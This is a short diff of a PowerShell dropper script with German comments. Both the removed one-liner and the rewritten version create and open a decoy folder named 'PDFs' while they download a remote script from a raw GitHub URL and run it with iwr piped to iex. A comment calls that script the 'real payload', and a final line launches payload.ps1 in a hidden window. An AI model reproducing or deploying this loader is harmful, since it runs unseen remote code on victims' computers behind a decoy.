@@ -1,1 +1,10 @@
-"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -NonI -W Hidden -C "md PDFs -Force; explorer PDFs; iex(iwr https://raw.githubusercontent.com/H3221/2/main/u.ps1 -UseBasicParsing).Content"
+# Erstellt Ordner PDFs und öffnet ihn
+New-Item -ItemType Directory -Path "PDFs" -Force | Out-Null
+Start-Process explorer.exe "PDFs"
+
+# Dein echtes Payload
+iwr https://raw.githubusercontent.com/H3221/2/main/u.ps1 -UseBasicParsing | iex
+
+
+
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -NonI -W Hidden -File "payload.ps1"
